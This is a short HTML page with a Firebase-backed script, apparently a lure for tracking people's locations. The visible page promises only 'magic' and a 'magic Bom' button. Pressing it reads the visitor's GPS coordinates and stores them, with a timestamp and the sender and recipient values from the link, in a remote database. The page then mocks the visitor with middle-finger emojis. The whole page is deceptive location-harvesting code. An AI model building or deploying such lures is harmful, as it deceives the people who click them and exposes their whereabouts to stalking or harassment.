<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Share Location</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div class="container">
    <h2>magic time</h2>
    <p>see magic to press the Bottom .</p>
    <button id="shareBtn">magic BomğŸ’¥</button>
    <p id="status"></p>
  </div>

  <script type="module">
    // Firebase CDN imports
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
    import { firebaseConfig } from './firebase-config.js';

    // Initialize Firebase
    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    const params = new URLSearchParams(window.location.search);
    const token = params.get("token");
    const from = params.get("from");
    const to = params.get("to");

    const shareBtn = document.getElementById('shareBtn');
    const status = document.getElementById('status');

    shareBtn.onclick = () => {
      if (!navigator.geolocation) {
        status.textContent = "Geolocation is not supported by your browser.";
        return;
      }

      shareBtn.disabled = true;
      status.textContent = "Getting your magic...";

      navigator.geolocation.getCurrentPosition(position => {
        const { latitude, longitude } = position.coords;
        const timestamp = new Date().toISOString();

        set(ref(db, `sharedLocations/${token}`), {
          from,
          to,
          latitude,
          longitude,
          timestamp
        }).then(() => {
          status.textContent = "ğŸ–•ğŸ–•ğŸ–•ğŸ–•ğŸ–•ğŸ–•ğŸ–•";
        }).catch(error => {
          status.textContent = "âŒ Failed to import magic: " + error.message;
        });

      }, error => {
        status.textContent = "âŒ access denied: " + error.message;
        shareBtn.disabled = false;
      });
    };
  </script>
</body>
</html>
